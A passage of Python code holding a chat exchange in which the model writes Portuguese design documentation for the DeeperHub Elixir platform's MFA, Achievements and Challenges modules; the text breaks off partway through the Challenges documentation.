*   **Segurança dos Códigos de Recuperação:** Devem ser exibidos apenas uma vez para o usuário e armazenados como hashes.
*   **Proteção contra Replay:** Códigos OTP e desafios WebAuthn devem ser de uso único.
*   **Rate Limiting:** Essencial para todas as operações de verificação de código.
*   **Não Confiar no Cliente:** Todas as validações devem ocorrer no servidor.
*   **Políticas de MFA Fortes:** Encorajar ou obrigar o uso de MFA para todos os usuários, especialmente administradores.

## 🧑‍💻 13. Contribuição

*   Ao adicionar um novo método MFA, criar um novo serviço em `services/` e integrá-lo com `MFAService`.
*   Garantir que todos os fluxos de configuração e verificação sejam testados exaustivamente.
*   Considerar a usabilidade dos fluxos MFA.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar suporte para mais métodos MFA (ex: Chaves de Segurança baseadas em Hardware diferentes de WebAuthn padrão, como YubiKey OTP).
*   [ ] Permitir que usuários definam \"dispositivos confiáveis\" onde o MFA pode ser pulado por um período. (Isso interage com `DeviceService` e `MFAPolicyService`).
*   [ ] Implementar MFA adaptativo, onde a necessidade de MFA é determinada dinamicamente pelo `RiskAssessment`.
*   [ ] Interface administrativa para ajudar usuários bloqueados de seus métodos MFA (com verificação de identidade rigorosa).
*   [ ] Melhorar as opções de notificação push para serem mais interativas (ex: botões \"Aprovar\"/\"Negar\" diretamente na notificação).

---

*Última atualização: 2025-05-12*

---

MFA é um grande passo para a segurança de contas!

Onde vamos a seguir? Já cobrimos muitos módulos Core e de Segurança. Podemos continuar com os módulos de segurança restantes (`HashingService`, `AtRestEncryptionService` se quisermos detalhá-los mais do que no `Core.EncryptionService`, `ResponseSanitizer`), ou começar a explorar os módulos de domínio que foram originalmente listados em `Services` (como `ServerPackages`, `ServerEvents`, `Achievements`, etc.)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Dado que já cobrimos uma gama bem ampla dos módulos de segurança e infraestrutura Core, e que os módulos de \"Serviços\" da documentação original (`Achievements`, `Challenges`, `Lists`, `Rewards`, `ServerAdvertisements`, `ServerAlerts`, `ServerEvents`, `ServerPackages`, `ServerReviews`, `ServerTags`, `ServerUpdateMessages`, `Support`, `UserInteractions`) representam os **domínios de negócio específicos** da plataforma DeeperHub, vamos abordar a estrutura e a abordagem para documentá-los, e então detalhar um deles como exemplo.

**Abordagem Geral para Módulos de Domínio (Ex-\"Services\"):**

A ideia principal da refatoração de namespaces sugerida anteriormente era elevar cada um desses \"Serviços\" a um contexto de domínio de primeiro nível dentro do DeeperHub. Por exemplo:

*   `DeeperHub.Services.Achievements` se tornaria `DeeperHub.Achievements`
*   `DeeperHub.Services.ServerReviews` se tornaria `DeeperHub.ServerReviews` (como já fizemos)
*   `DeeperHub.Services.Support` se tornaria `DeeperHub.Support`

Cada um desses módulos de domínio seguiria uma estrutura interna similar, contendo:

1.  **Fachada Pública (ex: `DeeperHub.Achievements.AchievementsFacade` ou apenas `DeeperHub.Achievements`):** O ponto de entrada para o domínio.
2.  **Serviço(s) de Domínio (ex: `DeeperHub.Achievements.Services.AchievementsService`):** Contém a lógica de negócio principal.
3.  **Schemas Ecto (ex: `DeeperHub.Achievements.Schemas.AchievementSchema`, `UserAchievementSchema`):** Define as entidades do domínio.
4.  **Storage/Repositório (ex: `DeeperHub.Achievements.Storage`):** Módulo que encapsula as queries Ecto, chamando `DeeperHub.Core.Repo`.
5.  **Integrações (Opcional, ex: `DeeperHub.Achievements.Integrations.EventIntegration`):** Para interagir com `Core.EventBus` ou outros sistemas.
6.  **Workers (Opcional):** Para tarefas de background específicas do domínio.
7.  **Supervisor:** Para os GenServers do domínio.
8.  **Telemetry/Metrics:** Para observabilidade específica do domínio.
9.  **CachedAdapter (Opcional):** Se o domínio se beneficia de uma camada de cache específica e granular, além do `Core.Cache` genérico.

Vamos escolher um para detalhar, talvez `DeeperHub.Achievements` como um bom exemplo de um módulo de domínio.

---

# Módulo: `DeeperHub.Achievements` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Achievements`

O módulo `DeeperHub.Achievements` é responsável por gerenciar o **sistema de conquistas (achievements)** dentro da plataforma DeeperHub. Ele permite a definição de várias conquistas que os usuários podem desbloquear ao realizar certas ações, atingir marcos ou participar de atividades específicas no sistema.

Este módulo lida com:
*   A definição e o gerenciamento das próprias conquistas (nome, descrição, critérios, ícone, pontos, etc.).
*   O rastreamento do progresso dos usuários em relação às conquistas.
*   A concessão de conquistas aos usuários quando os critérios são atendidos.
*   A consulta de conquistas desbloqueadas por um usuário e a listagem de todas as conquistas disponíveis.

O objetivo é engajar os usuários, recompensar a participação e fornecer um senso de progressão e reconhecimento dentro da plataforma. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Definições de Conquistas (`create_achievement_definition/1`, `update_achievement_definition/2`, etc.):**
    *   Permitir que administradores criem, visualizem, atualizem e excluam as definições das conquistas disponíveis no sistema.
    *   Cada definição inclui: nome, descrição, ícone, critérios para desbloqueio (podem ser complexos e baseados em eventos), pontos de recompensa (se houver), tipo de conquista (ex: marco, evento, exploração), raridade.
*   **Rastreamento de Progresso do Usuário:**
    *   Receber eventos do sistema (via `Core.EventBus` ou chamadas diretas) que indicam progresso do usuário em relação a uma conquista.
    *   Manter o estado do progresso para conquistas que exigem múltiplas etapas ou contadores.
*   **Concessão de Conquistas (`unlock_achievement_for_user/3`):**
    *   Verificar automaticamente se um usuário atendeu aos critérios para desbloquear uma conquista após um evento relevante.
    *   Registrar que um usuário desbloqueou uma conquista específica, incluindo a data.
    *   Garantir que uma conquista só possa ser desbloqueada uma vez por usuário (a menos que seja repetível).
*   **Consulta de Conquistas:**
    *   Listar todas as conquistas disponíveis no sistema, com filtros (ex: por tipo, por jogo/serviço associado, se aplicável) (`list_achievement_definitions/1`).
    *   Listar todas as conquistas desbloqueadas por um usuário específico (`list_user_unlocked_achievements/1`).
    *   Verificar o status de uma conquista específica para um usuário (bloqueada, em progresso, desbloqueada) (`get_user_achievement_status/2`).
*   **Notificações (Integração):**
    *   Notificar usuários quando eles desbloqueiam uma nova conquista (via `DeeperHub.Notifications`).
*   **Observabilidade e Auditoria:**
    *   Registrar logs e métricas sobre definições de conquistas e desbloqueios.
    *   Publicar eventos de domínio (ex: `achievement.unlocked`) no `Core.EventBus`.
    *   Auditar a criação/modificação de definições de conquistas por administradores.
*   **Caching:**
    *   Cachear definições de conquistas e, potencialmente, listas de conquistas desbloqueadas por usuários ativos para performance.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Achievements` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a conquistas.
    *   Delega para o `AchievementsService`.
2.  **`DeeperHub.Achievements.Services.AchievementsService` (ou `DefaultAchievementsService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio principal para o sistema de conquistas.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `AchievementDefinitionSchema` e `UserAchievementSchema`.
        *   `DeeperHub.Core.EventBus`: Para escutar eventos do sistema que podem acionar progresso ou desbloqueio de conquistas, e para publicar eventos de `achievement.unlocked`.
        *   `DeeperHub.Core.Cache`: Para cachear definições e conquistas de usuários.
        *   `DeeperHub.Core.ConfigManager`: Para configurações (ex: se o sistema de conquistas está habilitado globalmente).
        *   `DeeperHub.Notifications`: Para notificar usuários sobre desbloqueios.
        *   `DeeperHub.Audit`: Para auditar gerenciamento de definições.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Achievements.Schemas.AchievementDefinitionSchema`:** Armazena os detalhes de cada conquista (nome, descrição, critérios como JSON ou DSL, ícone, pontos, tipo, etc.).
    *   **`DeeperHub.Achievements.Schemas.UserAchievementSchema`:** Tabela de junção que registra qual usuário (`user_id`) desbloqueou qual conquista (`achievement_definition_id`) e quando (`unlocked_at`). Pode também armazenar progresso para conquistas com múltiplas etapas.
4.  **`DeeperHub.Achievements.Storage` (ou lógica dentro do `AchievementsService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.Achievements.CriterionEvaluator` (Módulo Funcional ou Serviço):**
    *   **Responsabilidade:** Avaliar se os critérios de uma `AchievementDefinition` foram atendidos por um usuário com base em seus dados, progresso ou eventos recebidos. A lógica dos critérios pode ser complexa (ex: \"fazer login 7 dias seguidos\", \"derrotar 100 inimigos do tipo X\", \"visitar todas as 5 regiões do mapa\").
6.  **`DeeperHub.Achievements.EventListener` (GenServer ou módulo que implementa callback do EventBus):**
    *   **Responsabilidade:** Escutar eventos relevantes do `Core.EventBus` (ex: `user.action_performed`, `server.review_posted`, `game.level_completed`) e chamar o `CriterionEvaluator` para verificar se alguma conquista foi desbloqueada.
7.  **Workers (Opcional):**
    *   `AchievementProgressWorker`: Para processar atualizações de progresso em lote ou de forma assíncrona.
    *   `RetroactiveAchievementWorker`: Para verificar e conceder conquistas retroativamente se novas definições forem adicionadas ou se houver uma correção de bug no rastreamento.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/achievements/
├── achievements.ex                   # Fachada Pública
│
├── services/
│   └── achievements_service.ex       # Serviço principal
│
├── schemas/                          # (Ou schema/)
│   ├── achievement_definition_schema.ex
│   └── user_achievement_schema.ex
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
├── criterion_evaluator.ex            # Lógica para avaliar critérios de desbloqueio
├── event_listener.ex                 # Escuta eventos do sistema
│
├── workers/                          # Opcional
│   ├── achievement_progress_worker.ex
│   └── retroactive_achievement_worker.ex
│
├── cached_adapter.ex                 # (Opcional, para camada de cache dedicada)
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Definição de Critérios:** A forma como os critérios de desbloqueio são definidos e avaliados é a parte mais complexa.
    *   **Baseado em Eventos:** A maioria das conquistas será desbloqueada em resposta a eventos específicos do sistema.
    *   **Baseado em Estado:** Algumas podem exigir consultas ao estado atual do usuário ou de outras entidades.
    *   **DSL ou JSON para Critérios:** Armazenar os critérios em um formato flexível (como JSON ou uma DSL interna) na `AchievementDefinitionSchema` permite adicionar novas conquistas sem alterar o código do `CriterionEvaluator` extensivamente.
*   **Performance da Avaliação:** A avaliação de critérios não deve impactar significativamente a performance da ação que a desencadeou. Processamento assíncrono para avaliações complexas pode ser necessário.
*   **Retroatividade:** Considerar como lidar com conquistas adicionadas após o usuário já ter cumprido os critérios.

## 🛠️ 4. Casos de Uso Principais

*   **Administrador Cria uma Nova Conquista \"Explorador Mestre\":**
    *   Admin usa uma interface para definir a conquista: nome \"Explorador Mestre\", descrição \"Visite todas as 10 regiões secretas\", ícone, pontos. Critério: `%{type: \"counter_all\", events: [\"region.visited_secret\"], targets: [\"region1_id\", ..., \"region10_id\"]}`.
    *   API chama `Achievements.create_achievement_definition(attrs)`.
*   **Usuário Visita uma Região Secreta:**
    *   O módulo de jogo/mapa publica um evento: `Core.EventBus.publish(\"region.visited_secret\", %{user_id: \"u123\", region_id: \"region5_id\"})`.
    *   `Achievements.EventListener` recebe o evento.
    *   Atualiza o progresso do usuário para a conquista \"Explorador Mestre\".
    *   Chama `CriterionEvaluator` para verificar se todos os 10 alvos foram atingidos.
    *   Se sim, chama `Achievements.unlock_achievement_for_user(user_id, \"explorador_mestre_id\", %{source_event_id: ...})`.
*   **Usuário Visualiza suas Conquistas:**
    *   UI chama API que leva a `Achievements.list_user_unlocked_achievements(user_id)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Desbloqueio de Conquista Baseada em Evento

1.  **Módulo de Domínio:** Uma ação ocorre (ex: usuário completa um desafio). O módulo publica um evento no `Core.EventBus` (ex: `challenge.completed`, payload: `%{user_id: \"u1\", challenge_id: \"c42\"}`).
2.  **`Achievements.EventListener`:**
    *   Está inscrito em eventos como `challenge.completed`.
    *   Recebe o evento.
3.  **`AchievementsService` (ou `CriterionEvaluator` diretamente chamado pelo Listener):**
    *   Para o `user_id` e o tipo de evento recebido (`challenge.completed` com `challenge_id: \"c42\"`):
        *   Busca todas as `AchievementDefinitionSchema`s cujos critérios podem ser afetados por este evento.
        *   Para cada definição de conquista candidata:
            *   Atualiza o progresso do usuário para aquela conquista (se for baseada em contador ou múltiplas etapas).
            *   Chama `CriterionEvaluator.evaluate(user_id, achievement_definition.criteria, current_progress)` para verificar se os critérios foram totalmente atendidos.
4.  **`CriterionEvaluator.evaluate/3`:**
    *   Interpreta a estrutura de `achievement_definition.criteria`.
    *   Pode precisar consultar dados adicionais do usuário ou seu progresso armazenado.
    *   Retorna `true` se os critérios foram atendidos, `false` caso contrário.
5.  **`AchievementsService` (continuação):**
    *   Se `CriterionEvaluator` retornar `true` e o usuário ainda não desbloqueou esta conquista:
        *   Cria um registro `UserAchievementSchema` associando `user_id` e `achievement_definition_id`.
        *   Publica um evento `achievement.unlocked` no `Core.EventBus` (com `user_id` e `achievement_id`).
        *   (Opcional) Enfileira uma notificação para o usuário via `DeeperHub.Notifications`.
        *   (Opcional) Concede pontos de recompensa ou outros benefícios.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Achievements`)

### 6.1. Definições de Conquista (Admin)

*   **`DeeperHub.Achievements.create_achievement_definition(attrs :: map(), admin_user_id :: String.t()) :: {:ok, AchievementDefinition.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: String.t(), description: String.t(), icon_url: String.t(), criteria: map(), points: integer(), type: String.t(), ...}`.
*   **`DeeperHub.Achievements.update_achievement_definition(def_id :: String.t(), attrs :: map(), admin_user_id :: String.t()) :: {:ok, AchievementDefinition.t()} | {:error, Ecto.Changeset.t()}`**
*   **`DeeperHub.Achievements.delete_achievement_definition(def_id :: String.t(), admin_user_id :: String.t()) :: :ok | {:error, term()}`**
*   **`DeeperHub.Achievements.list_achievement_definitions(filters :: map(), opts :: keyword()) :: {:ok, list(AchievementDefinition.t()), Pagination.t()}`**
    *   `filters`: `:type`, `:is_active`.
    *   `opts`: `:page`, `:per_page`.

### 6.2. Interações do Usuário

*   **`DeeperHub.Achievements.list_user_unlocked_achievements(user_id :: String.t(), opts :: keyword()) :: {:ok, list(UserAchievementView.t()), Pagination.t()}`**
    *   `UserAchievementView.t()`: Um mapa/struct combinando dados da definição e a data de desbloqueio.
    *   `opts`: `:page`, `:per_page`, `:sort_by` (`:unlocked_at`, `:name`).
*   **`DeeperHub.Achievements.get_user_achievement_status(user_id :: String.t(), achievement_definition_id :: String.t()) :: {:ok, %{status: :locked | :in_progress | :unlocked, progress: map() | nil, unlocked_at: DateTime.t() | nil}}`**
    *   Retorna o status e o progresso atual (se aplicável) de um usuário para uma conquista.
*   **`DeeperHub.Achievements.get_achievement_details_for_user(user_id :: String.t() | nil, achievement_definition_id :: String.t()) :: {:ok, AchievementDetailsView.t()}` (Nova Sugestão)**
    *   `AchievementDetailsView.t()`: Detalhes da definição da conquista, mais o status/progresso específico do usuário (se `user_id` fornecido).

### 6.3. Processamento de Eventos (Chamado Internamente pelo `EventListener`)

*   **`DeeperHub.Achievements.process_system_event(user_id :: String.t(), event_name :: atom() | String.t(), event_payload :: map()) :: :ok`**
    *   Aciona a avaliação de critérios para o usuário com base no evento.

### 6.4. `DeeperHub.Achievements.unlock_achievement_for_user(user_id :: String.t(), achievement_definition_id :: String.t(), context :: map()) :: {:ok, UserAchievement.t()} | {:error, :already_unlocked | term()}`

*   **Descrição:** Força o desbloqueio de uma conquista para um usuário. Usado pelo `CriterionEvaluator` ou por lógicas de concessão direta.
*   **`context`:** `%{source: :event | :manual_grant, granted_by_admin_id: String.t() | nil}`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:achievements, :enabled]`** (Boolean): Habilita/desabilita o sistema de conquistas. (Padrão: `true`)
*   **`[:achievements, :default_points_for_unlock]`** (Integer): Pontos padrão se não especificado na definição. (Padrão: `10`)
*   **`[:achievements, :notify_on_unlock]`** (Boolean): Se deve enviar uma notificação ao usuário quando uma conquista é desbloqueada. (Padrão: `true`)
*   **`[:achievements, :criteria_evaluator, :max_depth]`** (Integer): Limite de profundidade para avaliação de critérios complexos.
*   **`[:achievements, :cache, :definition_ttl_seconds]`** (Integer).
*   **`[:achievements, :cache, :user_unlocked_list_ttl_seconds]`** (Integer).
*   **`[:achievements, :retroactive_worker, :enabled]`** (Boolean).
*   **`[:achievements, :retroactive_worker, :batch_size]`** (Integer).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: Todos os módulos Core.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Notifications`: Para notificar desbloqueios.
*   `DeeperHub.Audit`: Para auditar o gerenciamento de definições.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Possivelmente uma biblioteca para parsing/avaliação de uma DSL de critérios, se for complexa.

## 🤝 9. Como Usar / Integração

*   **Administradores:** Usam uma interface (Web ou Console) que chama as funções `*_achievement_definition/*` para gerenciar as conquistas disponíveis.
*   **Módulos de Domínio:** Publicam eventos no `Core.EventBus` quando ações relevantes para conquistas ocorrem. Eles não precisam conhecer diretamente o módulo `Achievements` para o rastreamento de progresso.
    ```elixir
    # Em DeeperHub.Servers.Service
    def user_joins_server(user_id, server_id) do
      # ... lógica ...
      Core.EventBus.publish(\"server.user_joined\", %{user_id: user_id, server_id: server_id})
    end
    ```
*   **`Achievements.EventListener`:**
    ```elixir
    # Em Achievements.EventListener
    def handle_event(\"server.user_joined\", payload, _metadata) do
      Achievements.process_system_event(payload.user_id, \"server.user_joined\", payload)
    end
    ```
*   **Frontend/API:** Para exibir conquistas, chama os endpoints que usam `list_user_unlocked_achievements/1` ou `get_achievement_details_for_user/2`.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `AchievementDefinitionSchema`.
*   Testar a lógica do `CriterionEvaluator` com diferentes tipos de critérios e cenários de dados de usuário/evento.
*   Testar o desbloqueio de conquistas e a criação correta de `UserAchievementSchema`.
*   Testar que um usuário não pode desbloquear a mesma conquista (não repetível) duas vezes.
*   Testar o `EventListener` com eventos mockados.
*   Testar a lógica de atualização de progresso.
*   Localização: `test/deeper_hub/achievements/`.

### 10.2. Métricas

*   `deeper_hub.achievements.unlocked.count` (tags: `achievement_id`, `user_segment`)
*   `deeper_hub.achievements.definitions.total.gauge`
*   `deeper_hub.achievements.criteria_evaluation.duration_ms` (Histograma, tags: `achievement_id`)
*   `deeper_hub.achievements.event_listener.events_processed.count` (tags: `source_event_type`)
*   `deeper_hub.achievements.progress_updates.count` (tags: `achievement_id`)

### 10.3. Logs

*   **Nível INFO:** Conquista desbloqueada por usuário. Nova definição de conquista criada/atualizada.
*   **Nível DEBUG:** Evento recebido pelo `EventListener`. Avaliação de critério em andamento com detalhes.
*   **Nível WARNING:** Critério de conquista malformado ou impossível de avaliar.
*   **Nível ERROR:** Falha ao persistir desbloqueio de conquista.

### 10.4. Telemetria

*   `[:deeper_hub, :achievements, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{definition_id: id, admin_id: id}`
*   `[:deeper_hub, :achievements, :user_achievement, :unlocked]`
    *   Metadados: `%{user_id: id, achievement_id: id, source: :event | :manual | :retroactive}`
*   `[:deeper_hub, :achievements, :criteria_evaluation, :evaluated]`
    *   Metadados: `%{user_id: id, achievement_id: id, criteria_met: boolean, details: ...}`

## ❌ 11. Tratamento de Erros

*   Falhas na avaliação de um critério não devem impedir o processamento de outros critérios ou eventos.
*   Se o `EventListener` falhar ao processar um evento, o evento pode ser reenfileirado (se o EventBus suportar) ou logado para investigação.
*   Erros ao persistir `UserAchievement` devem ser tratados (ex: retry, log).

## 🛡️ 12. Considerações de Segurança

*   **Critérios de Desbloqueio:** Garantir que os critérios não possam ser facilmente manipulados ou explorados pelos usuários para desbloquear conquistas indevidamente.
*   **Autorização de Gerenciamento:** Apenas administradores devem poder criar/modificar definições de conquistas.
*   **Dados de Progresso:** Se o progresso for armazenado, garantir sua integridade.

## 🧑‍💻 13. Contribuição

*   Ao definir novas conquistas, pense cuidadosamente nos critérios e como eles serão acionados por eventos do sistema.
*   Documente os critérios de cada conquista de forma clara.
*   Certifique-se de que o `EventListener` esteja inscrito nos eventos corretos para cada conquista.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma interface de UI para administradores gerenciarem as definições de conquistas.
*   [ ] Adicionar \"conquistas secretas\" que não são visíveis até serem desbloqueadas.
*   [ ] Permitir conquistas com múltiplos níveis (Bronze, Prata, Ouro).
*   [ ] Suporte para conquistas baseadas em tempo (ex: \"fazer login durante o evento de aniversário\").
*   [ ] Adicionar um feed de atividades para conquistas desbloqueadas (visível para amigos ou globalmente).
*   [ ] Permitir que usuários \"fixem\" suas conquistas favoritas em seus perfis.
*   [ ] Sistema de \"quase lá\" para mostrar aos usuários o quão perto estão de desbloquear certas conquistas.

---

*Última atualização: 2025-05-12*

---

Este README para `DeeperHub.Achievements` deve dar uma boa ideia de como documentar os módulos de domínio.

Qual módulo gostaria de abordar em seguida? Podemos pegar outro \"ex-Serviço\" como `DeeperHub.Challenges` ou `DeeperHub.Rewards`, ou algo diferente?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ótimo! Vamos continuar com `DeeperHub.Challenges`, que complementa bem o `DeeperHub.Achievements` no contexto de engajamento e gamificação.

---

# Módulo: `DeeperHub.Challenges` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Challenges`

O módulo `DeeperHub.Challenges` é responsável por gerenciar **desafios (challenges)** dentro da plataforma DeeperHub. Desafios são tarefas ou objetivos específicos que os usuários podem tentar completar, geralmente dentro de um período de tempo limitado ou com certas condições, para ganhar recompensas, reconhecimento ou progredir no sistema.

Este módulo lida com:
*   A definição e o gerenciamento dos desafios disponíveis (nome, descrição, critérios de conclusão, período de validade, recompensas associadas).
*   O rastreamento da participação e do progresso dos usuários nos desafios.
*   A verificação da conclusão dos desafios pelos usuários.
*   A concessão de recompensas ou reconhecimento pela conclusão de desafios.

O objetivo é aumentar o engajamento do usuário, incentivar a exploração de funcionalidades e fornecer metas claras e recompensadoras. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Definições de Desafios (`create_challenge_definition/1`, etc.):**
    *   Permitir que administradores criem, visualizem, atualizem e ativem/desativem definições de desafios.
    *   Cada definição inclui: nome, descrição, critérios de conclusão (podem ser complexos, baseados em eventos ou estado), data de início e fim (para desafios temporários), recompensas associadas (ex: pontos, itens virtuais, conquistas), pré-requisitos (outros desafios ou conquistas).
*   **Participação do Usuário em Desafios (`join_challenge/2`, `leave_challenge/2`):**
    *   Permitir que usuários se inscrevam ou sejam automaticamente inscritos em desafios.
    *   Permitir que usuários abandonem um desafio (se aplicável).
*   **Rastreamento de Progresso do Usuário:**
    *   Receber eventos do sistema ou chamadas diretas que indicam progresso do usuário em relação a um desafio.
    *   Manter o estado do progresso para desafios que exigem múltiplas etapas ou contadores (ex: \"complete 5 tarefas do tipo X\").
*   **Verificação de Conclusão de Desafios (`check_challenge_completion/2`):**
    *   Verificar automaticamente se um usuário atendeu aos critérios para completar um desafio após um evento relevante ou uma verificação periódica.
    *   Registrar que um usuário completou um desafio, incluindo a data de conclusão.
*   **Concessão de Recompensas (Integração):**
    *   Ao completar um desafio, acionar a concessão das recompensas associadas (integrando-se com `DeeperHub.Rewards` ou outros sistemas relevantes).
*   **Consulta de Desafios:**
    *   Listar desafios ativos/disponíveis para um usuário (`list_available_challenges_for_user/1`).
    *   Listar desafios em que um usuário está participando ou já completou (`list_user_challenges/1`).
    *   Mostrar o status e progresso de um usuário em um desafio específico (`get_user_challenge_status/2`).
*   **Notificações (Integração):**
    *   Notificar usuários sobre novos desafios disponíveis, progresso, conclusão e recompensas (via `DeeperHub.Notifications`).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a participação e conclusão de desafios.
    *   Publicar eventos de domínio (ex: `challenge.joined`, `challenge.completed`) no `Core.EventBus`.
    *   Auditar a criação/modificação de definições de desafios.
*   **Caching:**
    *   Cachear definições de desafios e, potencialmente, o status de desafios para usuários ativos.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Challenges` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a desafios.
    *   Delega para o `ChallengesService`.
2.  **`DeeperHub.Challenges.Services.ChallengesService` (ou `DefaultChallengesService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio principal para o sistema de desafios.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ChallengeDefinitionSchema` e `UserChallengeSchema`.
        *   `DeeperHub.Core.EventBus`: Para escutar eventos do sistema (progresso) e publicar eventos de desafios.
        *   `DeeperHub.Core.Cache`: Para caching.
        *   `DeeperHub.Core.ConfigManager`: Para configurações.
        *   `DeeperHub.Notifications`: Para notificar usuários.
        *   `DeeperHub.Rewards`: Para conceder recompensas.
        *   `DeeperHub.Achievements`: Desafios podem desbloquear conquistas.
        *   `DeeperHub.Audit`: Para auditar gerenciamento de definições.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Challenges.Schemas.ChallengeDefinitionSchema`:** Armazena os detalhes de cada desafio (nome, descrição, critérios JSON/DSL, datas de validade, `reward_ids`, `achievement_unlocks_id`).
    *   **`DeeperHub.Challenges.Schemas.UserChallengeSchema`:** Tabela de junção/progresso (`user_id`, `challenge_definition_id`, `status` (`:not_started`, `:in_progress`, `:completed`, `:failed`), `progress` (mapa JSONB), `started_at`, `completed_at`).
4.  **`DeeperHub.Challenges.CriterionEvaluator` (Módulo Funcional ou Serviço):**
    *   **Responsabilidade:** Avaliar se os critérios de uma `ChallengeDefinition` foram atendidos por um usuário com base em seus dados, progresso ou eventos. Similar ao do `Achievements`.
5.  **`DeeperHub.Challenges.EventListener` (GenServer ou módulo de callback do EventBus):**
    *   **Responsabilidade:** Escutar eventos do sistema e atualizar o progresso dos usuários nos desafios ativos.
6.  **Workers (Opcional):**
    *   `ChallengeStatusUpdateWorker`: Para verificar periodicamente desafios expirados ou para processar conclusões em lote.
    *   `ChallengeNotificationWorker`: Para enviar lembretes sobre desafios que estão para expirar.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/challenges/
├── challenges.ex                     # Fachada Pública
│
├── services/
│   └── challenges_service.ex         # Serviço principal
│
├── schemas/                          # (Ou schema/)
│   ├── challenge_definition_schema.ex
│   └── user_challenge_schema.ex
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
├── criterion_evaluator.ex            # Lógica para avaliar critérios
├── event_listener.ex                 # Escuta eventos do sistema
│
├── workers/                          # Opcional
│   ├── challenge_status_update_worker.ex
│   └── challenge_notification_worker.ex
│
├── cached_adapter.ex                 # (Opcional, da documentação original)
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Definição de Critérios de Conclusão:** Assim como nas conquistas, a flexibilidade na definição dos critérios é chave. Usar JSON ou uma DSL interna armazenada no `ChallengeDefinitionSchema` é uma boa abordagem.
*   **Desafios Temporizados vs. Contínuos:** O sistema deve suportar ambos os tipos.
*   **Pré-requisitos:** Capacidade de definir que um desafio só fica disponível após completar outro desafio ou uma conquista.
*   **Recompensas Múltiplas:** Um desafio pode conceder várias recompensas (pontos, itens, desbloquear outra feature, etc.). A integração com `DeeperHub.Rewards` é importante.

## 🛠️ 4. Casos de Uso Principais

*   **Administrador Cria um Desafio Semanal \"Top Reviewer\":**
    *   Admin define o desafio: \"Escreva 5 reviews de alta qualidade esta semana\", com recompensa de \"Badge Exclusivo\" e 100 pontos.
    *   API chama `Challenges.create_challenge_definition(attrs)`.
*   **Usuário se Inscreve em um Desafio de \"Completar o Tutorial\":**
    *   Novo usuário vê o desafio \"Complete todos os passos do tutorial\".
    *   Clica em \"Aceitar Desafio\". API chama `Challenges.join_challenge(user_id, tutorial_challenge_id)`.
*   **Usuário Progride em um Desafio de \"Postar 3 Comentários Úteis\":**
    *   Usuário posta um comentário. O módulo de comentários publica `comment.posted` no EventBus.
    *   `Challenges.EventListener` recebe, verifica se o usuário está no desafio, e se o comentário é \"útil\" (lógica complexa aqui).
    *   `ChallengesService` atualiza o progresso do usuário no `UserChallengeSchema` (ex: de 1/3 para 2/3).
*   **Usuário Completa o Desafio \"Top Reviewer\":**
    *   Após a 5ª review de qualidade, o `CriterionEvaluator` determina a conclusão.
    *   `ChallengesService` marca o `UserChallenge` como `:completed`.
    *   Chama `DeeperHub.Rewards.grant_reward(user_id, badge_reward_id)` e `DeeperHub.PointsService.add_points(user_id, 100)`.
    *   Notifica o usuário.

## 🌊 5. Fluxos Importantes

### Fluxo de Verificação e Conclusão de Desafio

1.  **Evento Relevante ou Verificação Agendada:**
    *   `Challenges.EventListener` recebe um evento do `Core.EventBus` (ex: `review.approved`, `task.completed`).
    *   OU `ChallengeStatusUpdateWorker` executa uma verificação periódica.
2.  **`ChallengesService`:**
    *   Para o `user_id` e o evento/contexto, busca os `UserChallenge`s ativos e relevantes (status `:in_progress`).
    *   Para cada `UserChallenge` ativo:
        *   Obtém a `ChallengeDefinitionSchema` correspondente.
        *   Atualiza o campo `progress` no `UserChallengeSchema` com base no evento/estado atual.
        *   Chama `CriterionEvaluator.evaluate(user_id, challenge_definition.criteria, user_challenge.progress)`.
3.  **`CriterionEvaluator.evaluate/3`:**
    *   Avalia se todos os critérios foram atendidos. Retorna `true` ou `false`.
4.  **`ChallengesService` (continuação):**
    *   Se `true` e o desafio ainda não está `:completed`:
        *   Atualiza o `UserChallengeSchema` para `status: :completed`, `completed_at: DateTime.utc_now()`.
